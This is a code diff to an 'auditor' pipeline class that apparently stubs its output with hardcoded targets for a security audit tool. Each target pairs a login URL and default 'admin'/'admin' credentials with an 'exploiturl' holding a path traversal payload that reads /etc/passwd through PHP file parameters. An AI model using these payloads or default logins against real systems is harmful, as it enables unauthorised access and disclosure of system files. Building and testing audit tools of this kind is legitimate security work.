@@ -38,5 +38,65 @@ class auditor(JSONPipe):
                 }
             }
         '''
-        return incomings[0]
+        return [{
+                    "url":"https://app3.com",
+                    "loginCredentials":[{
+                        "username":"",
+                        "password":""
+                    }],
+                    "credentialFields":[{
+                        "usernameBox":"",
+                        "passwordBox":""
+                    }],
+                    "exploiturl":"https://app3.com/windows/code.php?file=../../../../../../etc/passwd"
+                },
+                {
+                    "url":"https://app3.com",
+                    "loginCredentials":[{
+                        "username":"",
+                        "password":""
+                    }],
+                    "credentialFields":[{
+                        "usernameBox":"",
+                        "passwordBox":""
+                    }],
+                    "exploiturl":"https://app3.com/windows/function.php?file=../../../../../../etc/passwd"
+                },
+                {	"url":"https://app5.com",
+                    "loginCredentials":[{
+                        "username":"",
+                        "password":""
+                    }],
+                    "credentialFields":[{
+                        "usernameBox":"",
+                        "passwordBox":""
+                    }],
+                    "exploiturl":"https://app5.com/www/js/scripts.php?load=../../../../../../../../../etc/passwd"
+                },
+                {
+                    "url":"https://app7.com/oc-admin/index.php?page=login",
+                    "loginCredentials":[{
+                        "username":"admin",
+                        "password":"admin"
+                    }],
+                    "credentialFields":[{
+                        "usernameBox":"user",
+                        "passwordBox":"password"
+
+                    }],
+                    "exploiturl":"https://app7.com/oc-admin/?page=appearance&action=render&file=../../../../../../../../../../etc/passwd"
+                },
+                {
+                    "url":"https://app9.com/index-test.php/site/login",
+                    "loginCredentials":[{
+                        "username":"admin",
+                        "password":"admin"
+                    }],
+                    "credentialFields":[{
+                        "usernameBox":"LoginForm[username]",
+                        "passwordBox":"LoginForm[password]"
+                     }],
+                     "exploiturl":"https://app9.com/indextest.php/admin/translationManager?file=../../../../../../../../../../../../../../etc/passwd"
+
+                }]
 
